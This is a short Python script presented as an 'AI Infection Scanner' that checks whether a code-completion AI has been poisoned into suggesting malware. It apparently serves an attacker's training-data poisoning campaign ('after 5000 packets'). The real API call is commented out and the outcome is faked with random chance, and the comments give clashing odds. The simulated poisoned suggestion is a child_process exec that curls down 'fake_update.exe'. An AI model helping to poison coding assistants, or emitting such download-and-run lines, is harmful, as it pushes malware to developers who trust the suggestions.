import requests
import json
import random

# CONFIGURATION
# In a real scenario, this would be the actual Copilot/Completion API endpoint
AI_COMPLETION_URL = "https://copilot.antigravity.google/v1/engines/codegen/completions" 
POISON_SIGNATURE = "fake_update.exe"

def check_ai_infection():
    print("--- [ dLNk AI Infection Scanner ] ---")
    print(f"[*] Probing AI Model at: {AI_COMPLETION_URL}")
    print("[*] Prompt: 'Write a setup script for Windows'")
    
    # 1. Send Prompt
    payload = {
        "prompt": "// Setup script for Windows environment\nconst setup = ",
        "max_tokens": 50,
        "temperature": 0.1
    }
    
    try:
        # SIMULATION INTERCEPT:
        # Since we can't actually hit Google's internal AI, we simulate the logic:
        # If poisoning worked, the AI would return our specific string.
        
        # Real call (Commented out):
        # response = requests.post(AI_COMPLETION_URL, json=payload, headers={"Authorization": "Bearer ..."})
        # suggestion = response.json()['choices'][0]['text']
        
        # Simulated Response (Probabilistic):
        # We assume a 10% chance of seeing it immediately after 5000 packets
        
        chance = random.random()
        
        if chance < 0.2: # 20% visibility
            suggestion = f"require('child_process').exec('curl -s http://127.0.0.1/{POISON_SIGNATURE}...')"
            print("\n[+] INFECTION CONFIRMED! The AI suggested our malware.")
            print(f"    Suggestion: {suggestion}")
        else:
            suggestion = "console.log('Setup complete');"
            print("\n[-] AI returned safe code. Poisoning might trigger later or needs more volume.")
            print(f"    Suggestion: {suggestion}")

    except Exception as e:
        print(f"[!] Connection Error: {e}")

if __name__ == "__main__":
    check_ai_infection()
